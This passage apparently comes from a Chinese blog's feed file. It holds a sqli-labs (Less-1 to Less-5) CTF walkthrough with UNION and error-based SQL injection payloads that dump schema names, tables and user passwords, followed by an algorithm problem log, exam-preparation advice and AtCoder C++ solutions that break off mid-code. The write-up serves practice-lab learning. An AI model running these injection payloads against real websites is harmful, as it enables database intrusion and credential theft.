x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p></li></ol><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ol><li>查询代码:<pre class="language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre></li><li>查询字段数量和回显点<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>数字<span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">23</span>这里最后查询到的字段数为<span class="token number">3</span>，回显点为<span class="token number">2</span>、<span class="token number">3</span>个字段</code></pre></li><li>查询数据库的版本和当前数据库<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果：</code></pre></li><li><p>查询所有数据库的名字</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>结果:information_schema<span class="token punctuation">,</span>challenges<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>security</code></pre></li><li><p>查询指定数据库的表的名字</p><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='</span>security'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果：emails<span class="token punctuation">,</span>referers<span class="token punctuation">,</span>uagents<span class="token punctuation">,</span>users</code></pre></li><li>查询指定数据库、表的列名<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>users'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>结果:id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password</code></pre></li><li>查询用户名和密码<pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select 1,(select group_concat(username separator '</span><span class="token punctuation">;</span><span class="token string">')from users),(select group_concat(password separator '</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre></li></ol><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>该题和Less-1差不多解法，区别在于Less-1是字符型注入，该题是数字型注入，具体不详细赘述了。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>该题和Less-1差不多解法，改变一下闭合方式。<br><pre class="language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>该题是使用报错注入的方法。<br><pre class="language-sql" data-language="sql"><code class="language-sql">数据库及相关信息:?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>数据库表名相关信息：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>数据库指定表的列名相关信息：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">'),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>数据库指定表指定列的字段：?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select group_concat(password)from security.users),0x7e),1)%23?id=1'</span><span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目记录</title>
      <link href="/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/05/05/%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="记录贴"><a href="#记录贴" class="headerlink" title="记录贴"></a>记录贴</h2><div class="table-container"><table><thead><tr><th style="text-align:center">题号</th><th style="text-align:center">来源</th><th style="text-align:center">题意</th><th style="text-align:center">知识点</th><th style="text-align:center">题解</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">1514C</td><td style="text-align:center"><a href="https://codeforces.com/contest/1514/problem/C">Codeforces</a></td><td style="text-align:center">给定一个序列从$1 \sim n$，求出一个最长子序列，这个子序列的乘积 $\pmod n$为1。</td><td style="text-align:center">数论</td><td style="text-align:center">理解 $gcd(p \% n,n)=gcd(p,n)  \neq 1$ 即可</td><td style="text-align:center"><a href="https://codeforces.com/contest/1514/submission/115107931">链接</a></td></tr><tr><td style="text-align:center">1512G</td><td style="text-align:center"><a href="https://codeforces.com/problemset/problem/1512/G">Codeforces</a></td><td style="text-align:center">定义一个式子$d(n)=\sum\limits_{kn}{k}$输入一个范围为$1\leq c \leq {10}^7$的数字，输出$d(c)$的值。</td><td style="text-align:center">数论</td><td style="text-align:center">用筛法，将所有$\leq 10^7$的算出来，查表即可;算法复杂度$O(nlogn)$</td><td style="text-align:center"><a href="https://codeforces.com/contest/1512/submission/115398043">链接</a></td></tr><tr><td style="text-align:center">ABC224E</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc224/tasks/abc224_e">Atcoder</a></td><td style="text-align:center">给定一个$h*w$矩阵和n个在矩阵上的点的权值，每个点可以向比他大的点的权值移动，求每个点的最大移动次数</td><td style="text-align:center">动态规划</td><td style="text-align:center">$dp[i]$表示第i个点的最大移动次数，$dp[i]=max(rmax[r[i]],cmax[c[i]]$,$rmax[r[i]]=max(rmax[r[i]],dp[i]+1)，cmax[c[i]]=max(cmax[c[i]],dp[i]+1)$更新。</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc224/submissions/26782930">链接</a></td></tr><tr><td style="text-align:center">ABC230E</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc230/editorial/3031">Atcoder</a></td><td style="text-align:center">给定一个数$n$，求$\sum_{i=1}^{N}{[\frac{N}{i}}]$，其中$[\frac{N}{i}]$表示下取整</td><td style="text-align:center">数学</td><td style="text-align:center">考虑$k=\sqrt{n}$,则所有的$[\frac{N}{i}]$均可以用$1,2,3,…,k$来表示，于是$\sum<em>{i=1}^{N}{[\frac{N}{i}]}=\sum</em>{i=1}^{k}{([\frac{N}{i}]-[\frac{N}{i+1}])*i}+\sum_{i=1}^{\frac{n}{k+1}}{i}$</td><td style="text-align:center"><a href="https://atcoder.jp/contests/abc230/submissions/27686946">连接</a></td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>考研经验</title>
      <link href="/2021/03/24/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/03/24/%E8%80%83%E7%A0%94%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h2 id="2021年上岸东北大学秦皇岛分校电子信息专业经验"><a href="#2021年上岸东北大学秦皇岛分校电子信息专业经验" class="headerlink" title="2021年上岸东北大学秦皇岛分校电子信息专业经验"></a>2021年上岸东北大学秦皇岛分校电子信息专业经验</h2><h3 id="一、-前言"><a href="#一、-前言" class="headerlink" title="一、 前言"></a>一、 前言</h3><ol><li>我在2021年考研中初试总分374，政治75，英语二72，数学二108，专业课842（C+数据结构+操作系统）119。我数学和专业课考得并不是很好，低于我得预期目标了，还好运气好，最终还是上岸了（惊险）。</li><li>现在如果大家准备考研得话应该还是在择校阶段，我建议热门专业，热门学校，热门地区三个中间选两个，这样可能会比较容易上岸一点。如果到暑假结束认为自己数学和专业课复习得还行得话，可以三个全选。</li><li>我在南书院复习的，不得不说，南书院的小姐姐真的好看。但是即使好看也不要有过多的想法，有想法也要等考研之后再说，考研压力会挺大的，偶尔心理也可能会有问题，建议这个时候放下笔，休息半天。</li><li>选择 $&gt;$ 努力</li></ol><h3 id="二、-英语"><a href="#二、-英语" class="headerlink" title="二、 英语"></a>二、 英语</h3><ol><li>单词：<br>英语我是从4月份开始陆陆续续背单词得，我先用得墨墨背单词，每天300个，后面背完了考研大纲词汇之后使用扇贝背单词，每天70新词+210旧词，今年新加了大纲词汇，扇贝单词有专门得整理。</li><li>阅读：<br>我使用得是张剑得黄皮书，虽然是英语二，但是我英语一得阅读也做了。阅读我还看了几年的唐迟的阅读课，他的技巧很不错。英语一阅读我刷了一遍，英语二阅读我刷了两遍。6-8月的时候我把英语一的阅读做完了，之后时间到考前就一直在做英语二的阅读。</li><li>写作：<br>我看的刘晓燕写作课，后面只剩两个月的时候，我每个礼拜平均练习2篇大作文，一篇小作文。最后半个月因为要背政治，时间比较紧，就没有练习。</li><li>翻译、完型：<br>我没有特别的练习，在最后做真题的时候和阅读一起掐表做的。</li></ol><h3 id="三、政治"><a href="#三、政治" class="headerlink" title="三、政治"></a>三、政治</h3><ol><li>网课：<br>我是9月份开始的，听的徐涛强化班，但是我听下来感觉没什么用（个人意见），可以试试腿姐的，如果时间紧，可以只看马原部分；腿姐的技巧班很好用，强烈推荐；</li><li>习题<br>肖秀荣1000题+肖八+肖四（肖秀荣yyds），可以做做腿四+徐八的选择题部分</li></ol><h3 id="四、数学"><a href="#四、数学" class="headerlink" title="四、数学"></a>四、数学</h3><ol><li>这门课学习效率很关键。数学战线拉的越长越好，先基础（很重要），基础全做对应该有110+（李永乐老师原话）。</li><li>我是听的汤家凤基础班(7-8)月 + 武忠祥的强化班（8-9）月，做题做的是李王复习全书+线性代数辅导讲义+660+330 ，李林108+李四+李八，张八我做了两套感觉没什么参考价值就没做了，还有做了合工大超越5套。 </li><li>我的建议是武忠祥基础班（配合660一起做）+武忠祥强化班（配合330一起做），复习全书在这之后写完，然后写李林的108，到这里差不多应该有模拟卷出来了，如果还没出来，可以做往年的合工大超越卷。</li></ol><h3 id="五、专业课"><a href="#五、专业课" class="headerlink" title="五、专业课"></a>五、专业课</h3><ol><li>我是用的王道+历年真题。</li><li>如果报名的是高梯度院校，课本必须自己过一遍，可以配合网课，但是课本一定要认真过一遍。</li><li>专业课复习要早一点，我自认为我不会有问题，到9月份才开始看的，然后也没怎么在意，最后就翻车了，要引以为戒。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder ABC 165</title>
      <link href="/2020/05/03/AtCoder-ABC-165/"/>
      <url>/2020/05/03/AtCoder-ABC-165/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="AtCoder-ABC-165-C-F"><a href="#AtCoder-ABC-165-C-F" class="headerlink" title="AtCoder ABC 165 (C~F)"></a>AtCoder ABC 165 (C~F)</h1><ul><li>前言:<br>这次感觉 $C$ 题和 $D$ 题反了一下。</li></ul><h2 id="C-Many-Requirements"><a href="#C-Many-Requirements" class="headerlink" title="C. Many Requirements"></a>C. Many Requirements</h2><ul><li><p>题意:<br>给定 $N,M,Q$ 表示有一个长度为 $N$ 的数组 $A$，数组的每个元素的范围为 $1 \leq A[i] \leq M$, 然后给定 $Q$ 个四元组 $a_i,b_i,c_i,d_i$ ，如果满足 $A[b_i]-A[a_i]=c_i$,则该数组的价值 $+d_i$  , 问价值最高是多少，数组 $A$ 为不下降序列。</p></li><li><p>题解：<br>一开始以为 $dfs$ 的话会超时，后来算了一下，发现只要枚举 $\tbinom{N+M+1}{M-1}$ 即可，这样最大值就是 $\tbinom{19}{9}=92378$ , $dfs$ 并不会超时。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">nd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> q<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ll tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token operator">==</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>c<span class="token punctuation">)</span>            tmp <span class="token operator">+=</span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    sum <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pos<span class="token operator">==</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> a<span class="token punctuation">[</span>pos<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> q<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>a <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>b <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>c <span class="token operator">>></span> node<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Floor-Function"><a href="#D-Floor-Function" class="headerlink" title="D. Floor Function"></a>D. Floor Function</h2><ul><li><p>题意:<br>给定 $A,B,N$，让你求出一个数 $x$ 使得 $floor(Ax/B)-A*floor(x/B)$的最大值</p></li><li><p>题解:<br>发现 $x=min(B-1,n)$ 的时候取最大值。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    db a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> a <span class="token operator">>></span> b <span class="token operator">>></span> n<span class="token punctuation">;</span>    db x <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">floor</span><span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">/</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Rotation-Matching"><a href="#E-Rotation-Matching" class="headerlink" title="E. Rotation Matching"></a>E. Rotation Matching</h2><ul><li><p>题意:<br>$N$ 个人，$M$ 个竞技场，每个竞技场会有编号，对应编号的人参与竞技，一次竞技之后所有参赛人数的编号 $+1 mod N$ ,问每个对手不不重复对战两次的排序方式。</p><ul><li>题解:<br>相差放数字即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> l <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> l <span class="token operator">+</span> x <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> l<span class="token operator">++</span><span class="token punctuation">,</span> x<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> r <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> r <span class="token operator">-</span> x <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> r<span class="token operator">--</span><span class="token punctuation">,</span> x<span class="token operator">--</span><span class="token punctuation">;</span>        f <span class="token operator">^=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="F-LIS-on-Tree"><a href="#F-LIS-on-Tree" class="headerlink" title="F. LIS on Tree"></a>F. LIS on Tree</h2><ul><li><p>题意:<br>给一个有 $N$ 个节点的树，每个节点有一个权值，问从 $1$ 开始访问到第 $k$ 个节点经过的路径权值序列的最长上升序列的长度是多少。</p></li><li><p>题解：<br>可以一边 $dfs$ 一边跑$LIS$，然后记录答案即可。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> rd<span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">,</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> now <span class="token operator">=</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>rd<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rd<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> rd<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lst<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">==</span>rd<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        pop <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> rd<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        lst <span class="token operator">=</span> rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">,</span> rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>    ans<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> rd<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token operator">!=</span>p<span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span>        rd<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        rd<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> lst<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token 